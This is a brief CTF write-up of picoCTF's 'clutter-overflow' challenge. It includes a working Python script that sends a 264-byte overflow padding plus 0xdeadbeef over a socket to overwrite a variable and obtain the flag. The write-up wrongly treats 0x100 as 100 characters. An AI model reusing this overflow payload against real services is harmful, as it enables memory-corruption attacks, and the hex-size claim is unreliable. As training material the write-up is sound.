This challenge was "clutter-overflow" on picoCTF: https://play.picoctf.org/practice/challenge/216?category=6&difficulty=2&page=3

For this challenge, the source code was given. The program ran in a way that would compare the "code" variable with a "GOAL" constant containing the value "0xdeadbeef", and would return the flag if they were equal. However, there was no direct way to set the code variable to be something.

But, this line appears in the source code:

------------------------------------------------------------------
#define SIZE 0x100
..
..
char clutter[SIZE];

..
..

gets(clutter);
------------------------------------------------------------------

This, paired with stdin as the buffer, meant that clutter can only hold 100 characters, so a buffer overflow into the code variable is totally possible. After some testing, I found the sweet spot to be 264 until the buffer overflows into the code variable. Now I just had to enter 0xdeadbeef into the buffer to get the flag. This was a problem, since this netcat connection was interactive only, so I couldn't put raw bytes in from the command line. Instead I made this script:

------------------------------------------------------------------
import socket
import time

HOST = "mars.picoctf.net"
PORT = 31890

payload = b"A" * 264 + b"\xef\xbe\xad\xde\x00\x00\x00\x00" + b"\n"

with socket.create_connection( ( HOST, PORT ) ) as s:
    time.sleep( 1 )
    response = s.recv( 4096 )
    print(response.decode( errors = "ignore" ) )

    s.sendall( payload )

    time.sleep( 1 )
    result = s.recv( 4096 )
    print( result.decode( errors = "ignore" ) )
------------------------------------------------------------------

This worked great, and allowed me to put raw bytes into the program, and returned the flag back to me.

